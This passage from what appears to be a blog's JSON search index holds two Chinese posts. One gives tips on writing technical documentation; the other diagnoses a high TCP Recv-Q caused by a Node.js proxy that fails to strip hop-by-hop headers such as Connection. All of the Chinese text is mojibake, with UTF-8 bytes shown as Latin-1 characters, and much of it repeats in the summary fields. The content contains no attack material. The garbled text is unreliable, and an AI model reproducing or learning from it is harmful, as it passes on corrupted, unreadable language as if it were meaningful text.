09:32:23ã€‚å˜é‡åuser_name, userNameã€‚ ä½¿ç”¨ä¸“ä¸šè¯è¯­ï¼šä¸è¦è¿‡äºå£è¯­åŒ– 3. æ€»ç»“: å†™å‡ºå¥½æ–‡æ¡£è¦æœ‰ä»¥ä¸‹å››ç‚¹ é€»è¾‘æ€§ï¼šä¾¿äºæŸ¥æ‰¾ ä¸“ä¸šæ€§: å€¼å¾—ä¿¡èµ–ï¼Œè´¨é‡ä¿è¯ è´£ä»»å¿ƒï¼šåŠæ—¶æ›´æ–°ï¼Œå‡†ç¡®æ€§ï¼Œå‘åå…¼å®¹ è¯»è€…å¿ƒï¼šä½ äº†è§£çš„ä¸œè¥¿ï¼Œåˆ«äººå¯èƒ½å¹¶ä¸æ¸…æ¥šã€‚ä»è¯»è€…çš„è§’åº¦å»è€ƒè™‘ï¼Œä»–ä»¬éœ€è¦ä»€ä¹ˆï¼Œè€Œä¸æ˜¯ä¸€å‘³å»å¼ºè°ƒä½ èƒ½æä¾›ä»€ä¹ˆã€‚ 4. å†™æ–‡æ¡£çš„å·¥å…· markdown: æ–¹ä¾¿å¿«æ·ï¼Œå¯ä»¥å¯¼å‡ºå„ç§æ ¼å¼çš„æ–‡ä»¶ swagger: åŠŸèƒ½å¼ºå¤§ï¼Œéœ€è¦éƒ¨ç½²ï¼Œä¸æ–¹ä¾¿ä¼ é€’æ–‡ä»¶ 5. markdown å·¥å…·æ¨è èš‚èšç¬”è®° è¿™æ˜¯æˆ‘æ­£ä½¿ç”¨çš„ã€‚ å…¨å¹³å°ï¼ˆmac windows iosï¼‰æœ‰å®¢æˆ·ç«¯ï¼Œå’Œæµè§ˆå™¨ç«¯ ç¬”è®°å¯ä»¥ç›´æ¥å…¬å¸ƒä¸ºåšå®¢ æ”¯æŒç‹¬ç«‹åŸŸå æ ‡ç­¾å¾ˆå¥½ç”¨ æ”¯æŒæ€ç»´å¯¼å›¾ æ”¯æŒå†å²è®°å½• cmd-markdown æœ‰é“äº‘ç¬”è®° 6. æ–‡æ¡£ä¹‹å¤– å…¬å¸æœ‰ä¸ªåŒäº‹ï¼Œæˆ‘æ›¾é—®ä»–ä½¿ç”¨ä»€ä¹ˆæœç´¢ä¸€äº›æŠ€æœ¯æ–‡æ¡£ï¼Œä»–è¯´ç”¨ç™¾åº¦ã€‚ä½œä¸ºä¸€ä¸ªç¿»å¢™è€å¸æœºï¼Œæˆ‘æƒŠè¯§çš„é—®ä»–ï¼šä½ ä¸ºä»€ä¹ˆä¸ç”¨è°·æ­Œå»æœç´¢ã€‚ä»–è¯´ä»–ä¸ä¼šç¿»å¢™ã€‚æˆ‘åªèƒ½å‘µå‘µä¸€ç¬‘ã€‚\nè‡ªä»æœ‰ä¸€æ¬¡æœç´¢ï¼šgraph for x^8 + y^8ï¼Œæˆ‘å°±å†³å®šä¸å†ä½¿ç”¨ç™¾åº¦äº†ã€‚ä½ å¯ä»¥çœ‹ä¸€ä¸‹ä¸¤è€…çš„è¿”å›ç»“æœæœ‰ä»€ä¹ˆä¸åŒã€‚\næ€»ä¹‹ï¼šæœ‰äº›é¸Ÿå„¿æ˜¯å…³ä¸ä½çš„ ä»–ä»¬çš„ç¾½æ¯›å¤ªé²œäº®äº†ã€‚\n","permalink":"https://wdd.js.org/posts/2018/02/how-to-write-a-technical-document/","summary":"æœ¬æ–‡æ¥è‡ªäºå…¬å¸å†…éƒ¨çš„ä¸€ä¸ªåˆ†äº«ã€‚ åœ¨æ–‡æ¡£æ–¹é¢ï¼Œå¯¹å†…çš„ä¸€äº›æ¥å£æ–‡æ¡£ä¸»è¦æ˜¯ç”¨swaggeræ¥å†™çš„ã€‚è™½ç„¶å¯ä»¥åœ¨çº¿æµ‹è¯•ï¼Œæ¯”è¾ƒæ–¹ä¾¿ã€‚ä½†æ˜¯ä¹Ÿå­˜åœ¨ç€ä¸€äº›æ›´æ–°ä¸åŠæ—¶ï¼Œswggeræ–‡æ¡£æ— æ³•å¯¼å‡ºæˆæ–‡ä»¶çš„é—®é¢˜ã€‚ åœ¨å¯¹å¤–æä¾›çš„æ–‡æ¡£æ–¹é¢ï¼šæˆ‘ä¸»è¦è´Ÿè´£åšä¸€ä¸ªæµè§ˆå™¨ç«¯çš„ä¸€ä¸ªjs sdkã€‚æ–‡æ¡£è¿˜ç®—å¯ä»¥githubåœ°å€ï¼Œæ‰€ä»¥æƒ³æŠŠä¸€äº›å†™æ–‡æ¡£çš„å¿ƒå¾—åˆ†äº«ç»™å¤§å®¶ã€‚\n1. è¡¡é‡å¥½æ–‡æ¡£çš„å”¯ä¸€æ ‡å‡†æ˜¯ä»€ä¹ˆï¼Ÿ Martin(Bobå¤§å”)æ›¾åœ¨ã€Šä»£ç æ•´æ´ä¹‹é“ã€‹ä¸€ä¹¦æ‰“è¶£åœ°è¯´ï¼šå½“ä½ çš„ä»£ç åœ¨åš Code Review æ—¶ï¼Œå®¡æŸ¥è€…è¦æ˜¯æ„¤æ€’åœ°å¼é“ï¼š\nâ€œWhat the fuck is this shit?â€ â€œDude, What the fuckï¼â€ ç­‰è¨€è¾æ¿€çƒˆçš„è¯è¯­æ—¶ï¼Œé‚£è¯´æ˜ä½ å†™çš„ä»£ç æ˜¯ Bad Codeï¼Œå¦‚æœå®¡æŸ¥è€…åªæ˜¯æ¼«ä¸ç»å¿ƒçš„åå‡ºå‡ ä¸ª\nâ€œWhat the fuck?â€ï¼Œ\né‚£è¯´æ˜ä½ å†™çš„æ˜¯ Good Codeã€‚è¡¡é‡ä»£ç è´¨é‡çš„å”¯ä¸€æ ‡å‡†å°±æ˜¯æ¯åˆ†é’Ÿéª‚å‡ºâ€œWTFâ€ çš„é¢‘ç‡ã€‚\nè¡¡é‡æ–‡æ¡£çš„æ ‡å‡†ä¹Ÿæ˜¯å¦‚æ­¤ã€‚\n2. å¥½æ–‡æ¡£çš„ç‰¹ç‚¹ ç®€æ´ï¼šä¸€å¥è¯å¯ä»¥è¯´å®Œçš„äº‹æƒ…ï¼Œå°±ä¸è¦åˆ†ä¸¤å¥è¯æ¥è¯´ã€‚å¹¶ä¸æ˜¯æ–‡æ¡£è¶Šåšè¶Šå¥½ï¼Œå¤ªåšçš„æ–‡æ¡£å¤§å¤šæ²¡äººçœ‹ã€‚ å‡†ç¡®: å­—æ®µç±»å‹ï¼Œé»˜è®¤å€¼ï¼Œå¤‡æ³¨ï¼Œæ˜¯å¦å¿…å¡«ç­‰å±æ€§è¯´æ˜ã€‚ é€»è¾‘æ€§: æ–‡æ¡£å¦‚ä½•åˆ’åˆ†ï¼Ÿ åˆ©äºæŸ¥çœ‹ã€‚ demoèƒœåƒè¨€: å¥½çš„demoèƒœè¿‡å„ç§å­—æ®µè¯´æ˜ï¼Œå¯ä»¥å¤åˆ¶ä¸‹æ¥ç›´æ¥ä½¿ç”¨ã€‚ è¯»è€…å¿ƒ: ä»è¯»è€…çš„è§’åº¦è€ƒè™‘, æ–¹æ³•å°½é‡ç®€æ´ã€‚å¯ä»¥ä¼ é€’ä¸€ä¸ªå‚æ•°æå®šçš„äº‹æƒ…ï¼Œç»å¯¹ä¸è¦è®©ç”¨æˆ·å»ä¼ ä¸¤ä¸ªå‚æ•°ã€‚ åŠæ—¶æ›´æ–°: ä¸æ›´æ–°çš„æ–‡æ¡£æ¯”bugæ›´ä¸¥é‡ã€‚ å‘åå…¼å®¹: ä¸è¦éšæ„åºŸå¼ƒå·²æœ‰çš„æ¥å£æˆ–è€…æŸä¸ªå­—æ®µï¼Œé™¤éä½ è€ƒè™‘åˆ°è¿™æ ·åšçš„åæœã€‚ å»ºç«‹æ–‡æ¡£è¯æ±‡è¡¨ï¼šæ¯ä¸ªæ¦‚å¿µåªæœ‰ä¸€ä¸ªåå­—ï¼Œä¸è¦éšæ„èµ·åå­—ï¼Œåä¸æ­£åˆ™è¨€ä¸é¡ºã€‚ æ ¼å¼ç»Ÿä¸€ï¼šä¾‹å¦‚æ—¶é—´æ ¼å¼ã€‚æˆ‘æ›¾è§è¿‡2017-09-12 09:32:23, æˆ–2017.09.12 09:32:23æˆ–2017.09.12 09:32:23ã€‚å˜é‡åuser_name, userNameã€‚ ä½¿ç”¨ä¸“ä¸šè¯è¯­ï¼šä¸è¦è¿‡äºå£è¯­åŒ– 3. æ€»ç»“: å†™å‡ºå¥½æ–‡æ¡£è¦æœ‰ä»¥ä¸‹å››ç‚¹ é€»è¾‘æ€§ï¼šä¾¿äºæŸ¥æ‰¾ ä¸“ä¸šæ€§: å€¼å¾—ä¿¡èµ–ï¼Œè´¨é‡ä¿è¯ è´£ä»»å¿ƒï¼šåŠæ—¶æ›´æ–°ï¼Œå‡†ç¡®æ€§ï¼Œå‘åå…¼å®¹ è¯»è€…å¿ƒï¼šä½ äº†è§£çš„ä¸œè¥¿ï¼Œåˆ«äººå¯èƒ½å¹¶ä¸æ¸…æ¥šã€‚ä»è¯»è€…çš„è§’åº¦å»è€ƒè™‘ï¼Œä»–ä»¬éœ€è¦ä»€ä¹ˆï¼Œè€Œä¸æ˜¯ä¸€å‘³å»å¼ºè°ƒä½ èƒ½æä¾›ä»€ä¹ˆã€‚ 4. å†™æ–‡æ¡£çš„å·¥å…· markdown: æ–¹ä¾¿å¿«æ·ï¼Œå¯ä»¥å¯¼å‡ºå„ç§æ ¼å¼çš„æ–‡ä»¶ swagger: åŠŸèƒ½å¼ºå¤§ï¼Œéœ€è¦éƒ¨ç½²ï¼Œä¸æ–¹ä¾¿ä¼ é€’æ–‡ä»¶ 5.","title":"å¦‚ä½•å†™å¥½æŠ€æœ¯æ–‡æ¡£?"},{"content":"1. é—®é¢˜ç°è±¡ ä½¿ç”¨netstat -ntpå‘½ä»¤æ—¶å‘ç°ï¼ŒRecv-Q 1692012 å¼‚å¸¸åé«˜ï¼ˆæ­£å¸¸æƒ…å†µä¸‹ï¼Œè¯¥å€¼åº”è¯¥æ˜¯0ï¼‰ï¼Œå¯¼è‡´åº”ç”¨å ç”¨è¿‡å¤šçš„å†…å­˜ã€‚\ntcp 1692012 0 172.17.72.4:48444 10.254.149.149:58080 ESTABLISHED 27/node é—®é¢˜åŸå› ï¼šä»£ç†çš„è½¬å‘æ—¶ï¼Œæ²¡æœ‰åˆ é™¤é€è·³é¦–éƒ¨\n2. ä»€ä¹ˆæ˜¯Hop-by-hop é€è·³é¦–éƒ¨ï¼Ÿ httpé¦–éƒ¨å¯ä»¥åˆ†ä¸ºä¸¤ç§\nç«¯åˆ°ç«¯é¦–éƒ¨ End-to-end: ç«¯åˆ°ç«¯é¦–éƒ¨ä»£ç†åœ¨è½¬å‘æ—¶å¿…é¡»æºå¸¦çš„ é€è·³é¦–éƒ¨ Hop-by-hop: é€è·³é¦–éƒ¨åªå¯¹å•æ¬¡è½¬å‘æœ‰æ•ˆï¼Œä»£ç†åœ¨è½¬å‘æ—¶ï¼Œå¿…é¡»åˆ é™¤è¿™äº›é¦–éƒ¨ é€è·³é¦–éƒ¨æœ‰ä»¥ä¸‹å‡ ä¸ª, è¿™äº›é¦–éƒ¨åœ¨ä»£ç†è¿›è¡Œè½¬å‘å‰å¿…é¡»åˆ é™¤\nConnetion Keep-Alive Proxy-Authenticate Proxy-Authortization Trailer TE Transfer-Encodeing Upgrade 3. ä»€ä¹ˆæ˜¯å“‘ä»£ç†ï¼Ÿ å¾ˆå¤šè€çš„æˆ–ç®€å•çš„ä»£ç†éƒ½æ˜¯ç›²ä¸­ç»§(blind relay),å®ƒä»¬åªæ˜¯å°†å­—èŠ‚ä»ä¸€ä¸ªè¿æ¥è½¬å‘åˆ°å¦ä¸€ä¸ªè¿æ¥ä¸­å»,ä¸å¯¹Connectioné¦–éƒ¨è¿›è¡Œç‰¹æ®Šçš„å¤„ç†ã€‚\n(1)åœ¨å›¾4-15aä¸­ Webå®¢æˆ·ç«¯å‘ä»£ç†å‘é€äº†ä¸€æ¡æŠ¥æ–‡,å…¶ä¸­åŒ…å«äº†Connection:Keep-Aliveé¦–éƒ¨,å¦‚æœå¯èƒ½çš„è¯è¯·æ±‚å»ºç«‹ä¸€æ¡keep-aliveè¿æ¥ã€‚å®¢æˆ·ç«¯ç­‰å¾…å“åº”,ä»¥ç¡®å®šå¯¹æ–¹æ˜¯å¦è®¤å¯å®ƒå¯¹keep-aliveä¿¡é“çš„è¯·æ±‚ã€‚\n(2) å“‘ä»£ç†æ”¶åˆ°äº†è¿™æ¡HTTPè¯·æ±‚,ä½†å®ƒå¹¶ä¸ç†è§£ Connectioné¦–éƒ¨(åªæ˜¯å°†å…¶ä½œä¸ºä¸€ä¸ªæ‰©å±•é¦–éƒ¨å¯¹å¾…)ã€‚ä»£ç†ä¸çŸ¥é“keep-aliveæ˜¯ä»€ä¹ˆæ„æ€,å› æ­¤åªæ˜¯æ²¿ç€è½¬å‘é“¾è·¯å°†æŠ¥æ–‡ä¸€å­—ä¸æ¼åœ°å‘é€ç»™æœåŠ¡å™¨(å›¾4-15b)ã€‚ä½†Connectioné¦–éƒ¨æ˜¯ä¸ªé€è·³é¦–éƒ¨,åªé€‚ç”¨äºå•æ¡ä¼ è¾“é“¾è·¯,ä¸åº”è¯¥æ²¿ç€ä¼ è¾“é“¾è·¯å‘ä¸‹ä¼ è¾“ã€‚æ¥ä¸‹æ¥,å°±è¦å‘ç”Ÿä¸€äº›å¾ˆç³Ÿç³•çš„äº‹æƒ…äº†ã€‚\n(3) åœ¨å›¾4-15bä¸­,ç»è¿‡ä¸­ç»§çš„HTTPè¯·æ±‚æŠµè¾¾äº†WebæœåŠ¡å™¨ã€‚å½“WebæœåŠ¡å™¨æ”¶åˆ°ç»è¿‡ä»£ç†è½¬å‘çš„Connection: Keep-Aliveé¦–éƒ¨æ—¶,ä¼šè¯¯ä»¥ä¸ºä»£ç†(å¯¹æœåŠ¡å™¨æ¥è¯´,è¿™ä¸ªä»£ç†çœ‹èµ·æ¥å°±å’Œæ‰€æœ‰å…¶ä»–å®¢æˆ·ç«¯ä¸€æ ·)å¸Œæœ›è¿›è¡Œkeep-aliveå¯¹è¯!å¯¹WebæœåŠ¡å™¨æ¥è¯´è¿™æ²¡ä»€ä¹ˆé—®é¢˜â€”â€”å®ƒåŒæ„è¿›è¡Œkeep-aliveå¯¹è¯,å¹¶åœ¨å›¾4-15cä¸­å›é€äº†ä¸€ä¸ªConnection: Keep-Aliveå“åº”é¦–éƒ¨ã€‚æ‰€ä»¥,æ­¤æ—¶W ebæœåŠ¡å™¨è®¤ä¸ºå®ƒåœ¨ä¸ä»£ç†è¿›è¡Œkeep-aliveå¯¹è¯,ä¼šéµå¾ªkeep-aliveçš„è§„åˆ™ã€‚ä½†ä»£ç†å´å¯¹keep-aliveä¸€æ— æ‰€çŸ¥ã€‚ä¸å¦™ã€‚\n(4) åœ¨å›¾4-15dä¸­,å“‘ä»£ç†å°†WebæœåŠ¡å™¨çš„å“åº”æŠ¥æ–‡å›é€ç»™å®¢æˆ·ç«¯,å¹¶å°†æ¥è‡ªWebæœåŠ¡å™¨çš„Connection: Keep-Aliveé¦–éƒ¨ä¸€èµ·ä¼ é€è¿‡å»ã€‚å®¢æˆ·ç«¯çœ‹åˆ°è¿™ä¸ªé¦–éƒ¨,å°±ä¼šè®¤ä¸ºä»£ç†åŒæ„è¿›è¡Œkeep-aliveå¯¹è¯ã€‚æ‰€ä»¥,æ­¤æ—¶å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨éƒ½è®¤ä¸ºå®ƒä»¬åœ¨è¿›è¡Œkeep-aliveå¯¹è¯,ä½†ä¸å®ƒä»¬è¿›è¡Œå¯¹è¯çš„ä»£ç†å´å¯¹keep-aliveä¸€æ— æ‰€çŸ¥ã€‚\n(5) ç”±äºä»£ç†å¯¹keep-aliveä¸€æ— æ‰€çŸ¥,æ‰€ä»¥ä¼šå°†æ”¶åˆ°çš„æ‰€æœ‰æ•°æ®éƒ½å›é€ç»™å®¢æˆ·ç«¯,ç„¶åç­‰å¾…æºç«¯æœåŠ¡å™¨å…³é—­è¿æ¥ã€‚ä½†æºç«¯æœåŠ¡å™¨ä¼šè®¤ä¸ºä»£ç†å·²ç»æ˜¾å¼åœ°è¯·æ±‚å®ƒå°†è¿æ¥ä¿æŒåœ¨æ‰“å¼€çŠ¶æ€äº†,æ‰€ä»¥ä¸ä¼šå»å…³é—­è¿æ¥ã€‚è¿™æ ·,ä»£ç†å°±ä¼šæŒ‚åœ¨é‚£é‡Œç­‰å¾…è¿æ¥çš„å…³é—­ã€‚\n(6) å®¢æˆ·ç«¯åœ¨å›¾4-15dä¸­æ”¶åˆ°äº†å›é€çš„å“åº”æŠ¥æ–‡æ—¶,ä¼šç«‹å³è½¬å‘ä¸‹ä¸€æ¡è¯·æ±‚,åœ¨keep-aliveè¿æ¥ä¸Šå‘ä»£ç†å‘é€å¦ä¸€æ¡è¯·æ±‚(å‚è§å›¾4-15e)ã€‚è€Œä»£ç†å¹¶ä¸è®¤ä¸ºåŒä¸€æ¡è¿æ¥ä¸Šä¼šæœ‰å…¶ä»–è¯·æ±‚åˆ°æ¥,è¯·æ±‚è¢«å¿½ç•¥,æµè§ˆå™¨å°±åœ¨è¿™é‡Œè½¬åœˆ,ä¸ä¼šæœ‰ä»»ä½•è¿›å±•äº†ã€‚\n(7) è¿™ç§é”™è¯¯çš„é€šä¿¡æ–¹å¼ä¼šä½¿æµè§ˆå™¨ä¸€ç›´å¤„äºæŒ‚èµ·çŠ¶æ€,ç›´åˆ°å®¢æˆ·ç«¯æˆ–æœåŠ¡å™¨å°†è¿æ¥è¶…æ—¶,å¹¶å°†å…¶å…³é—­ä¸ºæ­¢ã€‚ \u0026ndash;ã€ŠHTTPæƒå¨æŒ‡å—ã€‹\nè¿™æ˜¯HTTPæƒå¨æŒ‡å—ä¸­ï¼Œå…³äºHTTPå“‘ä»£ç†çš„æè¿°ã€‚è¿™é‡Œè¿™é‡Œè¯´äº†å“‘ä»£ç†ä¼šé€ æˆçš„ä¸€ä¸ªé—®é¢˜ã€‚\nè¿™ç§é”™è¯¯çš„é€šä¿¡æ–¹å¼ä¼šä½¿æµè§ˆå™¨ä¸€ç›´å¤„äºæŒ‚èµ·çŠ¶æ€,ç›´åˆ°å®¢æˆ·ç«¯æˆ–æœåŠ¡å™¨å°†è¿æ¥è¶…æ—¶,å¹¶å°†å…¶å…³é—­ä¸ºæ­¢ã€‚ å®é™…ä¸Šï¼Œæˆ‘è®¤ä¸ºå“‘ä»£ç†è¿˜æ˜¯é€ æˆä»¥ä¸‹é—®é¢˜çš„åŸå› \nTCPé“¾æ¥é«˜Recv-Q tcpé“¾æ¥ä¸æ–­å¼€ï¼Œå¯¼è‡´æœåŠ¡å™¨å†…å­˜è¿‡é«˜ï¼Œå†…å­˜æ³„éœ² èŠ‚ç‚¹iowaité«˜ åœ¨æˆ‘ä»¬è‡ªå·±çš„ä»£ç†çš„ä»£ç ä¸­ï¼Œæˆ‘æœ‰å‘ç°ï¼Œåœ¨ä»£ç†è¿›è¡Œè½¬å‘æ—¶ï¼Œåªåˆ é™¤äº†headers.host, å¹¶æ²¡æœ‰åˆ é™¤headers.Connectionç­‰é€è·³é¦–éƒ¨çš„å­—æ®µ\ndelete req.headers.host var option = { url: url, headers: req.headers } var proxy = request(option) req.pipe(proxy) proxy.pipe(res) 4. è§£å†³æ–¹æ¡ˆ è§£å†³æ–¹æ¡ˆæœ‰ä¸¤ä¸ªï¼Œ æˆ‘æ¨èä½¿ç”¨ç¬¬äºŒä¸ªæ–¹æ¡ˆï¼Œå…·ä½“æ–¹æ³•å‚è€ƒExpress ä»£ç†ä¸­é—´ä»¶çš„å†™æ³•\næ›´æ”¹è‡ªå·±çš„åŸæœ‰ä»£ç  ä½¿ç”¨æˆç†Ÿçš„å¼€æºäº§å“ 5. å‚è€ƒæ–‡çŒ® What is the reason for a high Recv-Q of a TCP connection? TCP buffers keep filling up (Recv-Q full): named unresponsive linuxæ¢ç§˜:netstatä¸­Recv-Q æ·±ç©¶ æ·±å…¥å‰–æ Socketâ€”â€”TCP é€šä¿¡ä¸­ç”±äºåº•å±‚é˜Ÿåˆ—å¡«æ»¡è€Œé€ æˆçš„æ­»é”é—®é¢˜ netstat Recv-Qå’ŒSend-Q æ·±å…¥å‰–æ Socketâ€”â€”æ•°æ®ä¼ è¾“çš„åº•å±‚å®ç° Use of Recv-Q and Send-Q ã€ç¾ã€‘David Gourley / Brian Totty HTTPæƒå¨æŒ‡å— ã€æ—¥ã€‘ä¸Šé‡å®£ äºå‡è‰¯ å›¾è§£HTTP ","permalink":"https://wdd.js.org/posts/2018/02/tcp-high-recv-q-or-send-q-reasons/","summary":"1. é—®é¢˜ç°è±¡ ä½¿ç”¨netstat -ntpå‘½ä»¤æ—¶å‘ç°ï¼ŒRecv-Q 1692012 å¼‚å¸¸åé«˜ï¼ˆæ­£å¸¸æƒ…å†µä¸‹ï¼Œè¯¥å€¼åº”è¯¥æ˜¯0ï¼‰ï¼Œå¯¼è‡´åº”ç”¨å ç”¨è¿‡å¤šçš„å†…å­˜ã€‚\ntcp 1692012 0 172.17.72.4:48444 10.254.149.149:58080 ESTABLISHED 27/node é—®é¢˜åŸå› ï¼šä»£ç†çš„è½¬å‘æ—¶ï¼Œæ²¡æœ‰åˆ é™¤é€è·³é¦–éƒ¨\n2. ä»€ä¹ˆæ˜¯Hop-by-hop é€è·³é¦–éƒ¨ï¼Ÿ httpé¦–éƒ¨å¯ä»¥åˆ†ä¸ºä¸¤ç§\nç«¯åˆ°ç«¯é¦–éƒ¨ End-to-end: ç«¯åˆ°ç«¯é¦–éƒ¨ä»£ç†åœ¨è½¬å‘æ—¶å¿…é¡»æºå¸¦çš„ é€è·³é¦–éƒ¨ Hop-by-hop: é€è·³é¦–éƒ¨åªå¯¹å•æ¬¡è½¬å‘æœ‰æ•ˆï¼Œä»£ç†åœ¨è½¬å‘æ—¶ï¼Œå¿…é¡»åˆ é™¤è¿™äº›é¦–éƒ¨ é€è·³é¦–éƒ¨æœ‰ä»¥ä¸‹å‡ ä¸ª, è¿™äº›é¦–éƒ¨åœ¨ä»£ç†è¿›è¡Œè½¬å‘å‰å¿…é¡»åˆ é™¤\nConnetion Keep-Alive Proxy-Authenticate Proxy-Authortization Trailer TE Transfer-Encodeing Upgrade 3. ä»€ä¹ˆæ˜¯å“‘ä»£ç†ï¼Ÿ å¾ˆå¤šè€çš„æˆ–ç®€å•çš„ä»£ç†éƒ½æ˜¯ç›²ä¸­ç»§(blind relay),å®ƒä»¬åªæ˜¯å°†å­—èŠ‚ä»ä¸€ä¸ªè¿æ¥è½¬å‘åˆ°å¦ä¸€ä¸ªè¿æ¥ä¸­å»,ä¸å¯¹Connectioné¦–éƒ¨è¿›è¡Œç‰¹æ®Šçš„å¤„ç†ã€‚\n(1)åœ¨å›¾4-15aä¸­ Webå®¢æˆ·ç«¯å‘ä»£ç†å‘é€äº†ä¸€æ¡æŠ¥æ–‡,å…¶ä¸­åŒ…å«äº†Connection:Keep-Aliveé¦–éƒ¨,å¦‚æœå¯èƒ½çš„è¯è¯·æ±‚å»ºç«‹ä¸€æ¡keep-aliveè¿æ¥ã€‚å®¢æˆ·ç«¯ç­‰å¾…å“åº”,ä»¥ç¡®å®šå¯¹æ–¹æ˜¯å¦è®¤å¯å®ƒå¯¹keep-aliveä¿¡é“çš„è¯·æ±‚ã€‚\n(2) å“‘ä»£ç†æ”¶åˆ°äº†è¿™æ¡HTTPè¯·æ±‚,ä½†å®ƒå¹¶ä¸ç†è§£ Connectioné¦–éƒ¨(åªæ˜¯å°†å…¶ä½œä¸ºä¸€ä¸ªæ‰©å±•é¦–éƒ¨å¯¹å¾…)ã€‚ä»£ç†ä¸çŸ¥é“keep-aliveæ˜¯ä»€ä¹ˆæ„æ€,å› æ­¤åªæ˜¯æ²¿ç€è½¬å‘é“¾è·¯å°†æŠ¥æ–‡ä¸€å­—ä¸æ¼åœ°å‘é€ç»™æœåŠ¡å™¨(å›¾4-15b)ã€‚ä½†Connectioné¦–éƒ¨æ˜¯ä¸ªé€è·³é¦–éƒ¨,åªé€‚ç”¨äºå•æ¡ä¼ è¾“é“¾è·¯,ä¸åº”è¯¥æ²¿ç€ä¼ è¾“é“¾è·¯å‘ä¸‹ä¼ è¾“ã€‚æ¥ä¸‹æ¥,å°±è¦å‘ç”Ÿä¸€äº›å¾ˆç³Ÿç³•çš„äº‹æƒ…äº†ã€‚\n(3) åœ¨å›¾4-15bä¸­,ç»è¿‡ä¸­ç»§çš„HTTPè¯·æ±‚æŠµè¾¾äº†WebæœåŠ¡å™¨ã€‚å½“WebæœåŠ¡å™¨æ”¶åˆ°ç»è¿‡ä»£ç†è½¬å‘çš„Connection: Keep-Aliveé¦–éƒ¨æ—¶,ä¼šè¯¯ä»¥ä¸ºä»£ç†(å¯¹æœåŠ¡å™¨æ¥è¯´,è¿™ä¸ªä»£ç†çœ‹èµ·æ¥å°±å’Œæ‰€æœ‰å…¶ä»–å®¢æˆ·ç«¯ä¸€æ ·)å¸Œæœ›è¿›è¡Œkeep-aliveå¯¹è¯!å¯¹WebæœåŠ¡å™¨æ¥è¯´è¿™æ²¡ä»€ä¹ˆé—®é¢˜â€”â€”å®ƒåŒæ„è¿›è¡Œkeep-aliveå¯¹è¯,å¹¶åœ¨å›¾4-15cä¸­å›é€äº†ä¸€ä¸ªConnection: Keep-Aliveå“åº”é¦–éƒ¨ã€‚æ‰€ä»¥,æ­¤æ—¶W ebæœåŠ¡å™¨è®¤ä¸ºå®ƒåœ¨ä¸ä»£ç†è¿›è¡Œkeep-aliveå¯¹è¯,ä¼šéµå¾ªkeep-aliveçš„è§„åˆ™ã€‚ä½†ä»£ç†å´å¯¹keep-aliveä¸€æ— æ‰€çŸ¥ã€‚ä¸å¦™ã€‚\n(4) åœ¨å›¾4-15dä¸­,å“‘ä»£ç†å°†WebæœåŠ¡å™¨çš„å“åº”æŠ¥æ–‡å›é€ç»™å®¢æˆ·ç«¯,å¹¶å°†æ¥è‡ªWebæœåŠ¡å™¨çš„Connection: Keep-Aliveé¦–éƒ¨ä¸€èµ·ä¼ é€è¿‡å»ã€‚å®¢æˆ·ç«¯çœ‹åˆ°è¿™ä¸ªé¦–éƒ¨,å°±ä¼šè®¤ä¸ºä»£ç†åŒæ„è¿›è¡Œkeep-aliveå¯¹è¯ã€‚æ‰€ä»¥,æ­¤æ—¶å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨éƒ½è®¤ä¸ºå®ƒä»¬åœ¨è¿›è¡Œkeep-aliveå¯¹è¯,ä½†ä¸å®ƒä»¬è¿›è¡Œå¯¹è¯çš„ä»£ç†å´å¯¹keep-aliveä¸€æ— æ‰€çŸ¥ã€‚\n(5) ç”±äºä»£ç†å¯¹keep-aliveä¸€æ— æ‰€çŸ¥,æ‰€ä»¥ä¼šå°†æ”¶åˆ°çš„æ‰€æœ‰æ•°æ®éƒ½å›é€ç»™å®¢æˆ·ç«¯,ç„¶åç­‰å¾…æºç«¯æœåŠ¡å™¨å…³é—­è¿æ¥ã€‚ä½†æºç«¯æœåŠ¡å™¨ä¼šè®¤ä¸ºä»£ç†å·²ç»æ˜¾å¼åœ°è¯·æ±‚å®ƒå°†è¿æ¥ä¿æŒåœ¨æ‰“å¼€çŠ¶æ€äº†,æ‰€ä»¥ä¸ä¼šå»å…³é—­è¿æ¥ã€‚è¿™æ ·,ä»£ç†å°±ä¼šæŒ‚åœ¨é‚£é‡Œç­‰å¾…è¿æ¥çš„å…³é—­ã€‚\n(6) å®¢æˆ·ç«¯åœ¨å›¾4-15dä¸­æ”¶åˆ°äº†å›é€çš„å“åº”æŠ¥æ–‡æ—¶,ä¼šç«‹å³è½¬å‘ä¸‹ä¸€æ¡è¯·æ±‚,åœ¨keep-aliveè¿æ¥ä¸Šå‘ä»£ç†å‘é€å¦ä¸€æ¡è¯·æ±‚(å‚è§å›¾4-15e)ã€‚è€Œä»£ç†å¹¶ä¸è®¤ä¸ºåŒä¸€æ¡è¿æ¥ä¸Šä¼šæœ‰å…¶ä»–è¯·æ±‚åˆ°æ¥,è¯·æ±‚è¢«å¿½ç•¥,æµè§ˆå™¨å°±åœ¨è¿™é‡Œè½¬åœˆ,ä¸ä¼šæœ‰ä»»ä½•è¿›å±•äº†ã€‚\n(7) è¿™ç§é”™è¯¯çš„é€šä¿¡æ–¹å¼ä¼šä½¿æµè§ˆå™¨ä¸€ç›´å¤„äºæŒ‚èµ·çŠ¶æ€,ç›´åˆ°å®¢æˆ·ç«¯æˆ–æœåŠ¡å™¨å°†è¿æ¥è¶…æ—¶,å¹¶å°†å…¶å…³é—­ä¸ºæ­¢ã€‚ \u0026ndash;ã€ŠHTTPæƒå¨æŒ‡å—ã€‹\nè¿™æ˜¯HTTPæƒå¨æŒ‡å—ä¸­ï¼Œå…³äºHTTPå“‘ä»£ç†çš„æè¿°ã€‚è¿™é‡Œè¿™é‡Œè¯´äº†å“‘ä»£ç†ä¼šé€ æˆçš„ä¸€ä¸ªé—®é¢˜ã€‚\nè¿™ç§é”™è¯¯çš„é€šä¿¡æ–¹å¼ä¼šä½¿æµè§ˆå™¨ä¸€ç›´å¤„äºæŒ‚èµ·çŠ¶æ€,ç›´åˆ°å®¢æˆ·ç«¯æˆ–æœåŠ¡å™¨å°†è¿æ¥è¶…æ—¶,å¹¶å°†å…¶å…³é—­ä¸ºæ­¢ã€‚ å®é™…ä¸Šï¼Œæˆ‘è®¤ä¸ºå“‘ä»£ç†è¿˜æ˜¯é€ æˆä»¥ä¸‹é—®é¢˜çš„åŸå› \nTCPé“¾æ¥é«˜Recv-Q 